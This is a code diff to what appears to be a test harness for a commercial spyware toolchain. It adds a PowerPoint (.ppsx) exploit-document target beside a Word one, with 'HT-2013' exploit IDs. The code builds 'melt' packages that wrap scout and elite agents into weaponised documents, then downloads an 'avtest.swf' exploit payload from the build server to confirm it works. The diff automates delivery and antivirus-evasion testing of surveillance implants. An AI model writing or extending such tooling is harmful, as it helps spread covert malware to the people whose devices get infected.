@@ -213,7 +213,13 @@ class AVAgent:
                     {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-002", 
                     "melt":{"demo":False, "scout":True, "admin":False}}, 
                 "platform":"exploit", "deliver": {"user":"USERID"},
-                "melt":{"filename":"example.doc", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
+                "melt":{"filename":"example.docx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
+            }
+            params['exploit_ppsx'] = {"generate": 
+                    {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-003", 
+                    "melt":{"demo":False, "scout":True, "admin":False}}, 
+                "platform":"exploit", "deliver": {"user":"USERID"},
+                "melt":{"filename":"example.ppsx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
             }
 
             param = params[self.platform]
@@ -228,7 +234,7 @@ class AVAgent:
                     print "- Melt build with: ", melt
                     appname = "exp_%s" % self.hostname
                     param['melt']['appname'] = appname
-                    param['melt']['url'] = "http://%s/%s" % (c.host, appname)
+                    param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
                     if 'deliver' in param:
                         param['deliver']['user'] = c.myid
                     r = c.build_melt(factory, param, melt, filename)
@@ -476,7 +482,9 @@ class AVAgent:
         meltfile = None
         if self.kind == 'melt':
             if self.platform == 'exploit_doc':
-                meltfile = 'assets/meltexploit.doc'
+                meltfile = 'assets/meltexploit.docx'
+            elif self.platform == 'exploit_ppsx':
+                meltfile = 'assets/meltexploit.ppsx'
             elif self.platform == 'exploit':
                 meltfile = 'assets/meltexploit.txt'
             else:
@@ -484,10 +492,32 @@ class AVAgent:
 
         exe = self._build_agent( factory_id, meltfile )
 
+        if "exploit_" in self.platform:
+            """ TODO: download """
+            if self.platform == 'exploit_doc': 
+                appname = "exp_%s/avtest.swf" % self.hostname
+            elif self.platform == 'exploit_ppsx':
+                appname = "pexp_%s/avtest.swf" % self.hostname
+
+            url = "http://%s/%s" % (self.host[1], appname)
+            print "DBG getting: %s" % url
+            u = urllib2.urlopen(url)
+            localFile = open('build/file.swf', 'w')
+            localFile.write(u.read())
+            localFile.close()
+
+            try:
+               with open('build/file.swf'): 
+                    print "+ SUCCESS EXPLOIT"
+            except IOError:
+               print "+ ERROR EXPLOIT"
+     
+            pass
         return factory_id, ident, exe
 
 internet_checked = False
 def execute_agent(args, level, platform):
+    """ starts the vm and execute elite,scout or pull, depending on the level """
     global internet_checked
 
     ftype = args.platform_type[platform]
@@ -523,7 +553,7 @@ def execute_agent(args, level, platform):
         vmavtest._send_results("ENDED")
 
 def elite(args):
-    """ starts a scout """
+    """ starts a elite """
     execute_agent(args, "elite", args.platform)
 
 def scout(args):
@@ -531,7 +561,7 @@ def scout(args):
     execute_agent(args, "scout", args.platform)
 
 def pull(args):
-    """ starts a scout """
+    """ deploys one or all platforms ('windows', 'linux', 'osx', 'exploit', 'exploit_doc', 'android', 'blackberry', 'ios') """
     if args.platform == "all":
         for platform in args.platform_type.keys():
             if platform.startswith("exploit"):
@@ -566,7 +596,7 @@ def clean(args):
     vmavtest._delete_targets(operation)
    
 def main():
-    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit', 'exploit_doc' ]
+    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit', 'exploit_doc', 'exploit_ppsx' ]
     platform_mobile =  [ 'android', 'blackberry', 'ios' ]
 
     platform_type = {}
